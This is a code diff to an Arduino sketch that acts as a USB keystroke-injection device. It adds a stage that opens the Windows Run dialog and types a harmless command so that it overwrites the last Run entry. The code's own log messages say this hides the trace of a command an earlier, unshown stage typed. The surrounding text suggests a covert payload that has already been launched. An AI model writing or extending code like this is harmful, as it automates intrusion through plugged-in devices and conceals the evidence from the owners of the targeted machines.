@@ -27,7 +27,7 @@ void setup()
 
   digitalWrite(LED_BUILTIN, HIGH);
 
-  //Serial.begin(9600);
+  Serial.begin(9600);
 
   Keyboard.begin();
 
@@ -90,7 +90,42 @@ void loop()
       stuffInih++;
       break;
     }
-    case 1: 
+    case 1:
+    {
+      Serial.println("Beginning overwrite last run command: Executing Win+R for RUN prompt.");
+
+      Keyboard.press(0x83);
+      Keyboard.print("r");
+      Keyboard.release(0x83);
+
+      timerStamp = millis();
+      while(millis() - timerStamp < 1000)
+      {
+        handleLEDBlinker();
+        delay(50);
+      }
+      
+      Serial.println("Writing in random gibberish to overwrite last run command...");
+      Keyboard.print("cmd.exe /c exit"); // RUN
+
+      Keyboard.print(" "); // END SCRIPT
+
+      Keyboard.press(KEY_RETURN);
+      delay(4);
+      Keyboard.release(KEY_RETURN);
+
+      Serial.println("Run command sent!");
+      timerStamp = millis();
+      while(millis() - timerStamp < 500)
+      {
+        handleLEDBlinker();
+        delay(50);
+      }
+
+      stuffInih++;
+      break;
+    }
+    case 2: 
     {
       stuffInih++;
       Serial.println("Job done! We're out! The rest will happen eventually.");
